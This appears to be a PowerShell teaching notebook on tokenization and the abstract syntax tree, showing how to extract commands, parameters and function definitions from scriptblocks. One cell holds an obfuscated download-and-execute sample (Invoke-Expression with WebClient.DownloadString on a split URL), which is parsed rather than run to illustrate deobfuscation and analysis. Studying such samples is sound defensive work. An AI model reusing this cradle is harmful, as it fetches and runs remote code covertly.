{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## The AST\n",
    "PowerShell interprets text input by splitting it into _tokens_, based on words and delimiting symbols (quotes for example). These tokens are then arranged into an _abstract syntax tree_ - a sort of dynamic data structure that gives meaning to the tokens when considered as a whole. An AST allows for words to be identified as commands and words following commands as parameters to that command."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "\u001b[32;1mContent     : \u001b[0mGet-Command\n",
      "\u001b[32;1mType        : \u001b[0mCommand\n",
      "\u001b[32;1mStart       : \u001b[0m1\n",
      "\u001b[32;1mLength      : \u001b[0m11\n",
      "\u001b[32;1mStartLine   : \u001b[0m1\n",
      "\u001b[32;1mStartColumn : \u001b[0m2\n",
      "\u001b[32;1mEndLine     : \u001b[0m1\n",
      "\u001b[32;1mEndColumn   : \u001b[0m13\n",
      "\n",
      "\u001b[32;1mContent     : \u001b[0m-ParameterType\n",
      "\u001b[32;1mType        : \u001b[0mCommandParameter\n",
      "\u001b[32;1mStart       : \u001b[0m13\n",
      "\u001b[32;1mLength      : \u001b[0m14\n",
      "\u001b[32;1mStartLine   : \u001b[0m1\n",
      "\u001b[32;1mStartColumn : \u001b[0m14\n",
      "\u001b[32;1mEndLine     : \u001b[0m1\n",
      "\u001b[32;1mEndColumn   : \u001b[0m28\n",
      "\n",
      "\u001b[32;1mContent     : \u001b[0mString\n",
      "\u001b[32;1mType        : \u001b[0mCommandArgument\n",
      "\u001b[32;1mStart       : \u001b[0m28\n",
      "\u001b[32;1mLength      : \u001b[0m6\n",
      "\u001b[32;1mStartLine   : \u001b[0m1\n",
      "\u001b[32;1mStartColumn : \u001b[0m29\n",
      "\u001b[32;1mEndLine     : \u001b[0m1\n",
      "\u001b[32;1mEndColumn   : \u001b[0m35\n",
      "\n",
      "\u001b[32;1mContent     : \u001b[0m|\n",
      "\u001b[32;1mType        : \u001b[0mOperator\n",
      "\u001b[32;1mStart       : \u001b[0m35\n",
      "\u001b[32;1mLength      : \u001b[0m1\n",
      "\u001b[32;1mStartLine   : \u001b[0m1\n",
      "\u001b[32;1mStartColumn : \u001b[0m36\n",
      "\u001b[32;1mEndLine     : \u001b[0m1\n",
      "\u001b[32;1mEndColumn   : \u001b[0m37\n",
      "\n"
     ]
    }
   ],
   "source": [
    "$code = { Get-Command -ParameterType String | Select-Object -First 10 }\n",
    "\n",
    "# the PSParser is the old PowerShell parser, but it is still useful for examining how PowerShell performs tokenization\n",
    "$tokens = [System.Management.Automation.PSParser]::Tokenize($code, [ref]$null)\n",
    "$tokens[0..3]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The AST of a scriptblock is itself an object of the type AST, with components of the AST being sub-objects of types that inherit from the AST class. For example, CommandAST objects contain the command sections of the AST."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "#  The PowerShell AST parser can be called directly on a piece of code, and the resulting AST structure can be examined\n",
    "$code = { Get-Command -ParameterType String | Select-Object -First 10 }\n",
    "# the FindAll() method of the AST class takes a function which it uses to match against objects in the AST\n",
    "\"===== Commands =====\"\n",
    "$code.AST.FindAll({$args[0] -is [System.Management.Automation.Language.CommandAst]},1)\n",
    "\"===== Parameters =====\"\n",
    "$code.AST.FindAll({$args[0] -is [System.Management.Automation.Language.CommandParameterAst]},1)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The power of the AST comes in how it enabled deep introspection of PowerShell code. For example, pulling the cmdlets out of this obfuscated string:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "\u001b[32;1mStringConstantType\u001b[0m\u001b[32;1m Value            \u001b[0m\u001b[32;1m StaticType   \u001b[0m\u001b[32;1m Extent\u001b[0m\n",
      "\u001b[32;1m------------------\u001b[0m \u001b[32;1m-----            \u001b[0m \u001b[32;1m----------   \u001b[0m \u001b[32;1m------                                          \u001b[0m\n",
      "          BareWord Invoke-Expression System.String Invoke-Expression                               \n",
      "                                     System.Object (& (`G`C`M *w-O*) \"`N`e`T`.`W`e`B`C`l`i`e`N`T\")…\n",
      "                                     System.Object (`G`C`M *w-O*)                                  \n",
      "      DoubleQuoted N\u001bT.W\u001bBCli\u001bNT    \u001b[0m System.String \"`N`e`T`.`W`e`B`C`l`i`e`N`T\"                    \n",
      "          BareWord GCM               System.String `G`C`M                                          \n",
      "          BareWord *w-O*             System.String *w-O*                                           \n",
      "\n"
     ]
    }
   ],
   "source": [
    "$code = {\n",
    "    Invoke-Expression (& (`G`C`M *w-O*) \"`N`e`T`.`W`e`B`C`l`i`e`N`T\").\"`D`o`w`N`l`o`A`d`S`T`R`i`N`g\"( 'ht'+'tps://' + 'bit.ly/sample')\n",
    "}\n",
    "$AST = [System.Management.Automation.Language.Parser]::ParseInput($code, [ref]$null, [ref]$null)\n",
    "$AST.FindAll(\n",
    "    { $args[0] -is [System.Management.Automation.Language.CommandAst] }, $true) | ForEach {\n",
    "    $_.CommandElements\n",
    "} | Format-Table -AutoSize"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Although realistically, this is better achieved by reviewing PowerShells scriptblock logs. A more practical example use case is using the AST to retrieve all the function definitions within a script:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "\u001b[32;1mName : \u001b[0mTestFunc\n",
      "\u001b[32;1mBody : \u001b[0m{\n",
      "               param(\n",
      "                   [Parameter(Mandatory = $true, Position = 1, HelpMessage = \"The message to \n",
      "       write\")]\n",
      "                   [string]$Message\n",
      "               )\n",
      "       \n",
      "               process {\n",
      "                   Write-Host \"Message: $message\"\n",
      "               }\n",
      "           }\n",
      "\n"
     ]
    }
   ],
   "source": [
    "$code = {\n",
    "    function TestFunc {\n",
    "        param(\n",
    "            [Parameter(Mandatory = $true, Position = 1, HelpMessage = \"The message to write\")]\n",
    "            [string]$Message\n",
    "        )\n",
    "\n",
    "        process {\n",
    "            Write-Host \"Message: $message\"\n",
    "        }\n",
    "    }\n",
    "}\n",
    "$AST = [System.Management.Automation.Language.Parser]::ParseInput($code, [ref]$null, [ref]$null)\n",
    "$AST.FindAll({$args[0] -is [System.Management.Automation.Language.FunctionDefinitionAst]}, $true) | \n",
    "    Select Name, Body | Format-List"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (C#)",
   "language": "C#",
   "name": ".net-csharp"
  },
  "language_info": {
   "name": "csharp"
  },
  "polyglot_notebook": {
   "kernelInfo": {
    "defaultKernelName": "csharp",
    "items": [
     {
      "aliases": [],
      "name": "csharp"
     }
    ]
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
